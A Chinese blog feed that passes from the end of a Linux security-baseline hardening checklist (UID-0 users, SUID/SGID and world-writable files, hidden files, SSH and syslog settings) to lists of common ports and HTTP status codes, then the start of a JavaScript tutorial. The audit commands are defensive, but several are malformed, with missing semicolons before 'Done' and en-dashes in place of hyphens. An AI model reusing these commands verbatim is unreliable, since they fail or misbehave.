href="#安全基线项说明-3" class="headerlink" title="安全基线项说明"></a>安全基线项说明</h5><p>帐号与口令-检查是否存在除 root 之外 UID 为 0 的用户</p><h5 id="检测操作步骤-4"><a href="#检测操作步骤-4" class="headerlink" title="检测操作步骤"></a>检测操作步骤</h5><p>执行：awk -F: ‘($3 &#x3D;&#x3D; 0) { print $1 }’ &#x2F;etc&#x2F;passwd</p><h5 id="基线符合性判定依据-4"><a href="#基线符合性判定依据-4" class="headerlink" title="基线符合性判定依据"></a>基线符合性判定依据</h5><p>返回值包括“root”以外的条目，则低于安全要求；</p><h5 id="备注-4"><a href="#备注-4" class="headerlink" title="备注"></a>备注</h5><p>补充操作说明 UID 为 0 的任何用户都拥有系统的最高特权，保证只有 root 用户的 UID 为 0</p><h4 id="2-1-6root-用户环境变量的安全性"><a href="#2-1-6root-用户环境变量的安全性" class="headerlink" title="2.1.6root 用户环境变量的安全性"></a>2.1.6root 用户环境变量的安全性</h4><h5 id="安全基线项目名称-4"><a href="#安全基线项目名称-4" class="headerlink" title="安全基线项目名称"></a>安全基线项目名称</h5><p>操作系统 Linux 超级用户环境变量安全基线要求项</p><h5 id="安全基线项说明-4"><a href="#安全基线项说明-4" class="headerlink" title="安全基线项说明"></a>安全基线项说明</h5><p>帐号与口令-root 用户环境变量的安全性</p><h5 id="检测操作步骤-5"><a href="#检测操作步骤-5" class="headerlink" title="检测操作步骤"></a>检测操作步骤</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">执行：echo $PATH | egrep &#x27;(^|:)(\.|:|$)&#x27;，检查是否包含父目录， </span><br><span class="line"></span><br><span class="line">执行：find `echo $PATH | tr &#x27;:&#x27; &#x27; &#x27;` -type d \( -perm -002 -o -perm -020 \) -ls，</span><br><span class="line"></span><br><span class="line">检查 是否包含组目录权限为 777 的目录</span><br></pre></td></tr></table></figure><h5 id="基线符合性判定依据-5"><a href="#基线符合性判定依据-5" class="headerlink" title="基线符合性判定依据"></a>基线符合性判定依据</h5><p>返回值包含以上条件，则低于安全要求；</p><h5 id="备注-5"><a href="#备注-5" class="headerlink" title="备注"></a>备注</h5><p>补充操作说明 确保 root 用户的系统路径中不包含父目录，在非必要的情况下，不应包含组 权限为 777 的目录</p><h3 id="2-2-认证"><a href="#2-2-认证" class="headerlink" title="2.2 认证"></a>2.2 认证</h3><h4 id="2-2-1远程连接的安全性配置"><a href="#2-2-1远程连接的安全性配置" class="headerlink" title="2.2.1远程连接的安全性配置"></a>2.2.1远程连接的安全性配置</h4><h5 id="安全基线项目名称-5"><a href="#安全基线项目名称-5" class="headerlink" title="安全基线项目名称"></a>安全基线项目名称</h5><p>操作系统 Linux 远程连接安全基线要求项</p><h5 id="安全基线项说明-5"><a href="#安全基线项说明-5" class="headerlink" title="安全基线项说明"></a>安全基线项说明</h5><p>帐号与口令-远程连接的安全性配置</p><h5 id="检测操作步骤-6"><a href="#检测操作步骤-6" class="headerlink" title="检测操作步骤"></a>检测操作步骤</h5><p>执行：find &#x2F; -name .netrc，检查系统中是否有.netrc 文件， </p><p>执行：find &#x2F; -name .rhosts ，检查系统中是否有.rhosts 文件</p><h5 id="基线符合性判定依据-6"><a href="#基线符合性判定依据-6" class="headerlink" title="基线符合性判定依据"></a>基线符合性判定依据</h5><p>返回值包含以上条件，则低于安全要求；</p><h5 id="备注-6"><a href="#备注-6" class="headerlink" title="备注"></a>备注</h5><p>补充操作说明 如无必要，删除这两个文件</p><h4 id="2-2-2用户的-umask-安全配置"><a href="#2-2-2用户的-umask-安全配置" class="headerlink" title="2.2.2用户的 umask 安全配置"></a>2.2.2用户的 umask 安全配置</h4><h5 id="安全基线项目名称-6"><a href="#安全基线项目名称-6" class="headerlink" title="安全基线项目名称"></a>安全基线项目名称</h5><p>操作系统 Linux 用户 umask 安全基线要求项</p><h5 id="安全基线项说明-6"><a href="#安全基线项说明-6" class="headerlink" title="安全基线项说明"></a>安全基线项说明</h5><p>帐号与口令-用户的 umask 安全配置</p><h5 id="检测操作步骤-7"><a href="#检测操作步骤-7" class="headerlink" title="检测操作步骤"></a>检测操作步骤</h5><p>执行：more &#x2F;etc&#x2F;profile more &#x2F;etc&#x2F;csh.login more &#x2F;etc&#x2F;csh.cshrc more  &#x2F;etc&#x2F;bashrc 检查是否包含 umask 值且 umask&#x3D;027</p><h5 id="基线符合性判定依据-7"><a href="#基线符合性判定依据-7" class="headerlink" title="基线符合性判定依据"></a>基线符合性判定依据</h5><p>umask 值是默认的，则低于安全要求</p><h5 id="备注-7"><a href="#备注-7" class="headerlink" title="备注"></a>备注</h5><p>补充操作说明 建议设置用户的默认 umask&#x3D;027</p><h4 id="2-2-3重要目录和文件的权限设置"><a href="#2-2-3重要目录和文件的权限设置" class="headerlink" title="2.2.3重要目录和文件的权限设置"></a>2.2.3重要目录和文件的权限设置</h4><h5 id="安全基线项目名称-7"><a href="#安全基线项目名称-7" class="headerlink" title="安全基线项目名称"></a>安全基线项目名称</h5><p>操作系统 Linux 目录文件权限安全基线要求项</p><h5 id="安全基线项说明-7"><a href="#安全基线项说明-7" class="headerlink" title="安全基线项说明"></a>安全基线项说明</h5><p>文件系统-重要目录和文件的权限设置</p><h5 id="检测操作步骤-8"><a href="#检测操作步骤-8" class="headerlink" title="检测操作步骤"></a>检测操作步骤</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">执行以下命令检查目录和文件的权限设置情况：</span><br><span class="line">ls –l /etc/</span><br><span class="line">ls –l /etc/rc.d/init.d/</span><br><span class="line">ls –l /tmp</span><br><span class="line">ls –l /etc/inetd.conf</span><br><span class="line">ls –l /etc/passwd</span><br><span class="line">ls –l /etc/shadow</span><br><span class="line">ls –l /etc/group</span><br><span class="line">ls –l /etc/security</span><br><span class="line">ls –l /etc/services</span><br><span class="line">ls -l /etc/rc*.d</span><br></pre></td></tr></table></figure><h5 id="基线符合性判定依据-8"><a href="#基线符合性判定依据-8" class="headerlink" title="基线符合性判定依据"></a>基线符合性判定依据</h5><p>若权限过低，则低于安全要求；</p><h5 id="备注-8"><a href="#备注-8" class="headerlink" title="备注"></a>备注</h5><p>对于重要目录，建议执行如下类似操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># chmod -R 750 /etc/rc.d/init.d/*</span><br></pre></td></tr></table></figure><p> 这样只有 root 可以读、写和执行这个目录下的脚本。</p><h4 id="2-2-4查找未授权的-SUID-x2F-SGID-文件"><a href="#2-2-4查找未授权的-SUID-x2F-SGID-文件" class="headerlink" title="2.2.4查找未授权的 SUID&#x2F;SGID 文件"></a>2.2.4查找未授权的 SUID&#x2F;SGID 文件</h4><h5 id="安全基线项目名称-8"><a href="#安全基线项目名称-8" class="headerlink" title="安全基线项目名称"></a>安全基线项目名称</h5><p>操作系统 Linux SUID&#x2F;SGID 文件安全基线要求项</p><h5 id="安全基线项说明-8"><a href="#安全基线项说明-8" class="headerlink" title="安全基线项说明"></a>安全基线项说明</h5><p>文件系统-查找未授权的 SUID&#x2F;SGID 文件</p><h5 id="检测操作步骤-9"><a href="#检测操作步骤-9" class="headerlink" title="检测操作步骤"></a>检测操作步骤</h5><p>用下面的命令查找系统中所有的 SUID 和 SGID 程序，执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for PART in `grep -v ^# /etc/fstab | awk &#x27;($6 != &quot;0&quot;) &#123;print $2 &#125;&#x27;`; do find $PART \( -perm -04000 -o -perm -02000 \) -type f -xdev -print Done</span><br></pre></td></tr></table></figure><h5 id="基线符合性判定依据-9"><a href="#基线符合性判定依据-9" class="headerlink" title="基线符合性判定依据"></a>基线符合性判定依据</h5><p>若存在未授权的文件，则低于安全要求；</p><h5 id="备注-9"><a href="#备注-9" class="headerlink" title="备注"></a>备注</h5><p>需要手工检查。 补充操作说明 建议经常性的对比 suid&#x2F;sgid 文件列表，以便能够及时发现可疑的后门程序</p><h4 id="2-2-5检查任何人都有写权限的目录"><a href="#2-2-5检查任何人都有写权限的目录" class="headerlink" title="2.2.5检查任何人都有写权限的目录"></a>2.2.5检查任何人都有写权限的目录</h4><h5 id="安全基线项目名称-9"><a href="#安全基线项目名称-9" class="headerlink" title="安全基线项目名称"></a>安全基线项目名称</h5><p>操作系统 Linux 目录写权限安全基线要求项</p><h5 id="安全基线项说明-9"><a href="#安全基线项说明-9" class="headerlink" title="安全基线项说明"></a>安全基线项说明</h5><p>文件系统-检查任何人都有写权限的目录</p><h5 id="检测操作步骤-10"><a href="#检测操作步骤-10" class="headerlink" title="检测操作步骤"></a>检测操作步骤</h5><p>在系统中定位任何人都有写权限的目录用下面的命令： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for PART in `awk &#x27;($3 == &quot;ext2&quot; || $3 == &quot;ext3&quot;) \ &#123; print $2 &#125;&#x27; /etc/fstab`; do find $PART -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print Done</span><br></pre></td></tr></table></figure><h5 id="基线符合性判定依据-10"><a href="#基线符合性判定依据-10" class="headerlink" title="基线符合性判定依据"></a>基线符合性判定依据</h5><p>若返回值非空，则低于安全要求；</p><h5 id="备注-10"><a href="#备注-10" class="headerlink" title="备注"></a>备注</h5><p>需要手工检查。</p><h4 id="2-2-6查找任何人都有写权限的文件"><a href="#2-2-6查找任何人都有写权限的文件" class="headerlink" title="2.2.6查找任何人都有写权限的文件"></a>2.2.6查找任何人都有写权限的文件</h4><h5 id="安全基线项目名称-10"><a href="#安全基线项目名称-10" class="headerlink" title="安全基线项目名称"></a>安全基线项目名称</h5><p>操作系统 Linux 文件写权限安全基线要求项</p><h5 id="安全基线项说明-10"><a href="#安全基线项说明-10" class="headerlink" title="安全基线项说明"></a>安全基线项说明</h5><p>文件系统-查找任何人都有写权限的文件</p><h5 id="检测操作步骤-11"><a href="#检测操作步骤-11" class="headerlink" title="检测操作步骤"></a>检测操作步骤</h5><p>在系统中定位任何人都有写权限的文件用下面的命令： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for PART in `grep -v ^# /etc/fstab | awk &#x27;($6 != &quot;0&quot;) &#123;print $2 &#125;&#x27;`; do find $PART -xdev -type f \( -perm -0002 -a ! -perm -1000 \) -print Done</span><br></pre></td></tr></table></figure><h5 id="基线符合性判定依据-11"><a href="#基线符合性判定依据-11" class="headerlink" title="基线符合性判定依据"></a>基线符合性判定依据</h5><p>若返回值非空，则低于安全要求；</p><h5 id="备注-11"><a href="#备注-11" class="headerlink" title="备注"></a>备注</h5><p>需要手工检查。</p><h4 id="2-2-7检查没有属主的文件"><a href="#2-2-7检查没有属主的文件" class="headerlink" title="2.2.7检查没有属主的文件"></a>2.2.7检查没有属主的文件</h4><h5 id="安全基线项目名称-11"><a href="#安全基线项目名称-11" class="headerlink" title="安全基线项目名称"></a>安全基线项目名称</h5><p>操作系统 Linux 文件所有权安全基线要求项</p><h5 id="安全基线项说明-11"><a href="#安全基线项说明-11" class="headerlink" title="安全基线项说明"></a>安全基线项说明</h5><p>文件系统-检查没有属主的文件</p><h5 id="检测操作步骤-12"><a href="#检测操作步骤-12" class="headerlink" title="检测操作步骤"></a>检测操作步骤</h5><p>定位系统中没有属主的文件用下面的命令： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for PART in `grep -v ^# /etc/fstab | awk &#x27;($6 != &quot;0&quot;) &#123;print $2 &#125;&#x27;`; do find $PART -nouser -o -nogroup -print done </span><br></pre></td></tr></table></figure><p>注意：不用管“&#x2F;dev”目录下的那些文件。</p><h5 id="基线符合性判定依据-12"><a href="#基线符合性判定依据-12" class="headerlink" title="基线符合性判定依据"></a>基线符合性判定依据</h5><p>若返回值非空，则低于安全要求；</p><h5 id="备注-12"><a href="#备注-12" class="headerlink" title="备注"></a>备注</h5><p>需要手工检查。 </p><p>补充操作说明 </p><p>发现没有属主的文件往往就意味着有黑客入侵你的系统了。不能允许没有主 人的文件存在。如果在系统中发现了没有主人的文件或目录，先查看它的完 整性，如果一切正常，给它一个主人。有时候卸载程序可能会出现一些没有 主人的文件或目录，在这种情况下可以把这些文件和目录删除掉。</p><h4 id="2-2-8检查异常隐含文件"><a href="#2-2-8检查异常隐含文件" class="headerlink" title="2.2.8检查异常隐含文件"></a>2.2.8检查异常隐含文件</h4><h5 id="安全基线项目名称-12"><a href="#安全基线项目名称-12" class="headerlink" title="安全基线项目名称"></a>安全基线项目名称</h5><p>操作系统 Linux 隐含文件安全基线要求项</p><h5 id="安全基线项说明-12"><a href="#安全基线项说明-12" class="headerlink" title="安全基线项说明"></a>安全基线项说明</h5><p>文件系统-检查异常隐含文件</p><h5 id="检测操作步骤-13"><a href="#检测操作步骤-13" class="headerlink" title="检测操作步骤"></a>检测操作步骤</h5><p>用“find”程序可以查找到这些隐含文件。例如： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;.. *&quot; -print –xdev </span><br><span class="line"># find / -name &quot;…*&quot; -print -xdev | cat -v </span><br></pre></td></tr></table></figure><p>同时也要注意象“.xx”和“.mail”这样的文件名的。（这些文件名看起来都 很象正常的文件名）</p><h5 id="基线符合性判定依据-13"><a href="#基线符合性判定依据-13" class="headerlink" title="基线符合性判定依据"></a>基线符合性判定依据</h5><p>若返回值非空，则低于安全要求；</p><h5 id="备注-13"><a href="#备注-13" class="headerlink" title="备注"></a>备注</h5><p>需要手工检查。 </p><p>补充操作说明 </p><p>在系统的每个地方都要查看一下有没有异常隐含文件（点号是起始字符的， 用“ls”命令看不到的文件），因为这些文件可能是隐藏的黑客工具或者其它 一些信息（口令破解程序、其它系统的口令文件，等等）。在 UNIX 下，一个 常用的技术就是用一些特殊的名，如：“…”、“.. ”（点点空格）或“..^G” （点点 control-G），来隐含文件或目录。</p><h4 id="2-2-9登录超时设置"><a href="#2-2-9登录超时设置" class="headerlink" title="2.2.9登录超时设置"></a>2.2.9登录超时设置</h4><h5 id="安全基线项目名称-13"><a href="#安全基线项目名称-13" class="headerlink" title="安全基线项目名称"></a>安全基线项目名称</h5><p>操作系统 Linux 登录超时设置</p><h5 id="安全基线项说明-13"><a href="#安全基线项说明-13" class="headerlink" title="安全基线项说明"></a>安全基线项说明</h5><p>帐号与口令-检查登录超时设置</p><h5 id="检测操作步骤-14"><a href="#检测操作步骤-14" class="headerlink" title="检测操作步骤"></a>检测操作步骤</h5><p>使用命令“cat &#x2F;etc&#x2F;profile |grep TMOUT”查看 TMOUT 是否被设置</p><h5 id="基线符合性判定依据-14"><a href="#基线符合性判定依据-14" class="headerlink" title="基线符合性判定依据"></a>基线符合性判定依据</h5><p>返回值为空或值低于 180，则低于安全要求</p><h5 id="备注-14"><a href="#备注-14" class="headerlink" title="备注"></a>备注</h5><p>使用命令“vi &#x2F;etc&#x2F;profile”修改配置文件，添加“TMOUT&#x3D;”行开头的注释， 建议设置为“TMOUT&#x3D;180”，即超时时间为 3 分钟</p><h4 id="2-2-10使用-SSH-远程登录"><a href="#2-2-10使用-SSH-远程登录" class="headerlink" title="2.2.10使用 SSH 远程登录"></a>2.2.10使用 SSH 远程登录</h4><h5 id="安全基线项目名称-14"><a href="#安全基线项目名称-14" class="headerlink" title="安全基线项目名称"></a>安全基线项目名称</h5><p>操作系统 Linux SSH 安全连接要求</p><h5 id="安全基线项说明-14"><a href="#安全基线项说明-14" class="headerlink" title="安全基线项说明"></a>安全基线项说明</h5><p>对于使用 IP 协议进行远程维护的设备，设备应配置使用 SSH 等加密协议。</p><h5 id="检测操作步骤-15"><a href="#检测操作步骤-15" class="headerlink" title="检测操作步骤"></a>检测操作步骤</h5><p>查看 SSH 服务状态： # service ssh status 查看 telnet 服务状态： # service telnet status</p><h5 id="基线符合性判定依据-15"><a href="#基线符合性判定依据-15" class="headerlink" title="基线符合性判定依据"></a>基线符合性判定依据</h5><p>SSH 服务状态查看结果为：running</p><p>telnet 服务状态查看结果为：not running&#x2F;unrecognized</p><h5 id="备注-15"><a href="#备注-15" class="headerlink" title="备注"></a>备注</h5><h4 id="2-2-11Root-远程登录限制"><a href="#2-2-11Root-远程登录限制" class="headerlink" title="2.2.11Root 远程登录限制"></a>2.2.11Root 远程登录限制</h4><h5 id="安全基线项目名称-15"><a href="#安全基线项目名称-15" class="headerlink" title="安全基线项目名称"></a>安全基线项目名称</h5><p>操作系统 Linux 超级用户登录设置</p><h5 id="安全基线项说明-15"><a href="#安全基线项说明-15" class="headerlink" title="安全基线项说明"></a>安全基线项说明</h5><p>对 SSH 服务进行安全检查</p><h5 id="检测操作步骤-16"><a href="#检测操作步骤-16" class="headerlink" title="检测操作步骤"></a>检测操作步骤</h5><p>使用命令“cat &#x2F;etc&#x2F;ssh&#x2F;sshd_config”查看配置文件 </p><p>（1）检查是否允许 root 直接登录 检查“PermitRootLogin ”的值是否为 no </p><p>（2）检查 SSH 使用的协议版本 检查“Protocol”的值</p><h5 id="基线符合性判定依据-16"><a href="#基线符合性判定依据-16" class="headerlink" title="基线符合性判定依据"></a>基线符合性判定依据</h5><p>使用命令“vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config”编辑配置文件 </p><p>（1）不允许 root 直接登录 设置“PermitRootLogin ”的值为 no </p><p>（2）修改 SSH 使用的协议版本 设置“Protocol”的版本为 2</p><h5 id="备注-16"><a href="#备注-16" class="headerlink" title="备注"></a>备注</h5><p>root 用户需要使用普通用户远程登录后 su 进行系统管理</p><h4 id="2-2-12关闭不必要的服务"><a href="#2-2-12关闭不必要的服务" class="headerlink" title="2.2.12关闭不必要的服务"></a>2.2.12关闭不必要的服务</h4><h5 id="安全基线项目名称-16"><a href="#安全基线项目名称-16" class="headerlink" title="安全基线项目名称"></a>安全基线项目名称</h5><p>操作系统 Linux 关闭不必要的服务</p><h5 id="安全基线项说明-16"><a href="#安全基线项说明-16" class="headerlink" title="安全基线项说明"></a>安全基线项说明</h5><p>操作系统 Linux 关闭不必要的服务</p><h5 id="检测操作步骤-17"><a href="#检测操作步骤-17" class="headerlink" title="检测操作步骤"></a>检测操作步骤</h5><p>使用命令“who -r”查看当前 init 级别 </p><p>使用命令“chkconfig –list &lt;服务名&gt;”查看所有服务的状态</p><h5 id="基线符合性判定依据-17"><a href="#基线符合性判定依据-17" class="headerlink" title="基线符合性判定依据"></a>基线符合性判定依据</h5><p>若有不必要的系统在当前级别下为 on，则低于安全要求</p><h5 id="备注-17"><a href="#备注-17" class="headerlink" title="备注"></a>备注</h5><p>需要手工检查。 使用命令“chkconfig –level  &lt;服务名&gt; on|off|reset”设置服务在个 init 级别下开机是否启动</p><h2 id="第三章：日志审计"><a href="#第三章：日志审计" class="headerlink" title="第三章：日志审计"></a>第三章：日志审计</h2><h3 id="3-1日志：syslog-登录事件记录"><a href="#3-1日志：syslog-登录事件记录" class="headerlink" title="3.1日志：syslog 登录事件记录"></a>3.1日志：syslog 登录事件记录</h3><h5 id="安全基线项目名称：-1"><a href="#安全基线项目名称：-1" class="headerlink" title="安全基线项目名称："></a>安全基线项目名称：</h5><p>操作系统 Linux 登录审计安全基线要求项</p><h5 id="安全基线项说明：-1"><a href="#安全基线项说明：-1" class="headerlink" title="安全基线项说明："></a>安全基线项说明：</h5><p>日志审计-syslog 登录事件记录</p><h5 id="检测操作步骤："><a href="#检测操作步骤：" class="headerlink" title="检测操作步骤："></a>检测操作步骤：</h5><p>执行命令：more &#x2F;etc&#x2F;syslog.conf </p><p>查看参数 authpriv 值</p><h5 id="基线符合性判定依据："><a href="#基线符合性判定依据：" class="headerlink" title="基线符合性判定依据："></a>基线符合性判定依据：</h5><p>若未对所有登录事件都记录，则低于安全要求；</p><h5 id="备注："><a href="#备注：" class="headerlink" title="备注："></a>备注：</h5><p>需要手工检查。</p><h3 id="3-2审计：Syslog-conf-的配置审核"><a href="#3-2审计：Syslog-conf-的配置审核" class="headerlink" title="3.2审计：Syslog.conf 的配置审核"></a>3.2审计：Syslog.conf 的配置审核</h3><h5 id="安全基线项目名称：-2"><a href="#安全基线项目名称：-2" class="headerlink" title="安全基线项目名称："></a>安全基线项目名称：</h5><p>操作系统 Linux 配置审计安全基线要求项</p><h5 id="安全基线项说明：-2"><a href="#安全基线项说明：-2" class="headerlink" title="安全基线项说明："></a>安全基线项说明：</h5><p>日志审计-Syslog.conf 的配置审核</p><h5 id="检测操作步骤：-1"><a href="#检测操作步骤：-1" class="headerlink" title="检测操作步骤："></a>检测操作步骤：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">执行：more /etc/syslog.conf，查看是否设置了下列项：</span><br><span class="line">kern.warning;*.err;authpriv.none\t@loghost</span><br><span class="line">*.info;mail.none;authpriv.none;cron.none\t@loghost</span><br><span class="line">*.emerg\t@loghost</span><br><span class="line">local7.*\t@loghost</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="基线符合性判定依据：-1"><a href="#基线符合性判定依据：-1" class="headerlink" title="基线符合性判定依据："></a>基线符合性判定依据：</h5><p>若未设置，则低于安全要求；</p><h5 id="备注：-1"><a href="#备注：-1" class="headerlink" title="备注："></a>备注：</h5><p>需要手工检查。 补充操作说明 建议配置专门的日志服务器，加强日志信息的异地同步备份</p><h2 id="第四章：系统文件"><a href="#第四章：系统文件" class="headerlink" title="第四章：系统文件"></a>第四章：系统文件</h2><h4 id="4-系统-core-dump-状态"><a href="#4-系统-core-dump-状态" class="headerlink" title="4.系统 core dump 状态"></a>4.系统 core dump 状态</h4><h5 id="安全基线项目名称：-3"><a href="#安全基线项目名称：-3" class="headerlink" title="安全基线项目名称："></a>安全基线项目名称：</h5><p>操作系统 Linux core dump 状态安全基线要求项</p><h5 id="安全基线项说明：-3"><a href="#安全基线项说明：-3" class="headerlink" title="安全基线项说明："></a>安全基线项说明：</h5><p>系统文件-系统 core dump 状态</p><h5 id="检测操作步骤：-2"><a href="#检测操作步骤：-2" class="headerlink" title="检测操作步骤："></a>检测操作步骤：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">执行：more /etc/security/limits.conf 检查是否包含下列项：</span><br><span class="line">* soft core 0</span><br><span class="line">* hard core 0</span><br></pre></td></tr></table></figure><h5 id="基线符合性判定依据：-2"><a href="#基线符合性判定依据：-2" class="headerlink" title="基线符合性判定依据："></a>基线符合性判定依据：</h5><p>若不存在，则低于安全要求</p><h5 id="备注：-2"><a href="#备注：-2" class="headerlink" title="备注："></a>备注：</h5><p>补充操作说明 core dump 中可能包括系统信息，易被入侵者利用，建议关闭</p>]]></content>
      
      
      <categories>
          
          <category> 前提知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>常见端口号</title>
      <link href="/2022/09/10/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E5%8F%B7/"/>
      <url>/2022/09/10/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<p>21FTP      </p><p>22SSH</p><p>23telnet</p><p>25SMTP</p><p>53DNS</p><p>80http</p><p>110POP3</p><p>161SNMP</p><p>443https </p><p>445SMB</p><p>1433sql server</p><p>1521Oracle</p><p>3306MySql</p><p>3389RDP </p><p>4000QQ</p><p>7001WebLogic</p><p>8080TomCat</p><p>200： 成功，请求数据通过响应报文的entity-body部分发送;OK</p><p>301： 请求的URL指向的资源已经被删除；但在响应报文中通过首部Location指明了资源现               在所处的新位置；Moved Permanently</p><p>302： 响应报文Location指明资源临时新位置 Moved Temporarily</p><p>304： 客户端发出了条件式请求，但服务器上的资源未曾发生改变，则通过响应此响应状态             码通知客户端；Not Modified</p><p>307:   浏览器内部重定向</p><p>401： 需要输入账号和密码认证方能访问资源；Unauthorized</p><p>403： 请求被禁止；Forbidden</p><p>404： 服务器无法找到客户端请求的资源；Not Found</p><p>500： 服务器内部错误；Internal Server Error</p><p>502： 代理服务器从后端服务器收到了一条伪响应，如无法连接到网关；Bad Gateway</p><p>503： 服务不可用，临时服务器维护或过载，服务器无法处理请求</p><p>504： 网关超时</p>]]></content>
      
      
      <categories>
          
          <category> 前提知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript</title>
      <link href="/2022/09/10/JavaScript/"/>
      <url>/2022/09/10/JavaScript/</url>
      
        <content type="html"><![CDATA[<h1 id="定义"><a href="#定义" class="headerlink" title="定义 :"></a>定义 :</h1><p>JavaScript是运行在浏览器端的脚本语言，JavaScript主要解决的是前端与用户交互的问题，包括使用交互与数据交互。JavaScript是浏览器解释执行的 . </p><h1 id="语法"><a href="#语法" class="headerlink" title="语法 :"></a>语法 :</h1><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景 :"></a>使用场景 :</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一种直接写入:<span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/JavaScript&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">第二种外部引入:<span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">第三种a标签写入:<span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>&quot;<span class="attr">JavaScript:void</span>(<span class="attr">0</span>)&quot;&gt;</span>a标签的方式<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="comment">//阻止跳转</span></span><br><span class="line"></span><br><span class="line">第四种方式 标签属性: <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1234)&quot;</span>&gt;</span>点击按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span> <span class="comment">//鼠标左键单击事件</span></span><br></pre></td></tr></table></figure><h3 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明 :"></a>变量声明 :</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line">    <span class="keyword">var</span> 变量名字 = <span class="number">100</span>; </span><br><span class="line"><span class="keyword">var</span>num=<span class="number">200</span>;</span><br><span class="line"><span class="keyword">var</span>num=<span class="number">300</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(num);<span class="comment">// 在屏幕显示,打印变量.</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num);<span class="comment">//在F12控制台里面显示.</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 请注意 , 变量是从上往下执行 , 变量名会被下面的变量名覆盖.</span></span><br></pre></td></tr></table></figure><h3 id="变量命名规则"><a href="#变量命名规则" class="headerlink" title="变量命名规则 :"></a>变量命名规则 :</h3><ul><li>字母数字下划线($)</li><li>首字母不能为数字</li><li>严格区分大小写</li><li>且不能使用关键字</li></ul><h3 id="代码注释"><a href="#代码注释" class="headerlink" title="代码注释 :"></a>代码注释 :</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 单行注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">多行注释</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>()<span class="comment">//将内容写到html文档中</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>()<span class="comment">//将内容写到浏览器的控制台</span></span><br></pre></td></tr></table></figure><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h3 id="数字类型-Number"><a href="#数字类型-Number" class="headerlink" title="数字类型(Number)"></a>数字类型(Number)</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span 